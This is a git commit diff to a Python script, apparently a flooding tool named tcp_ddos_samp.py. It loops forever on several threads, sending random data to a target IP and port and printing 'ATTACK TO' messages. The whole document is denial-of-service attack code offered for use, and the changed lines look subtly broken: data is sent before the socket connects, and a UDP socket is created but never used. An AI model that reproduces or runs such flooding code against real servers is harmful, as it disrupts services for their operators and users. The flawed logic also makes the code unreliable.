c3efbb1feb5d2f48bd0d8498172aba1efe7d9ff9
AnonymousX <93084047+AnonymousX0-0@users.noreply.github.com>
2022-01-07 10:24:39 +0700

    Update tcp_ddos_samp.py

--- tcp_ddos_samp.py
+++ tcp_ddos_samp.py
@@ -14,11 +14,14 @@ threads = int(input("PING:"))
 def run():
 	data = random._urandom(1204)
 	while True:
+			n = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			addr = (str(ip),int(port))
+			s.send(data)
+			s.connect((ip,port))
 			for x in range(1):
-				s.connect((ip,port))
+				s.sendto(data,addr)
                 
-				
 			print("[+] ATTACK TO", ip, port, "PING EXPORT =", threads)
 			
 for Y in range(threads):
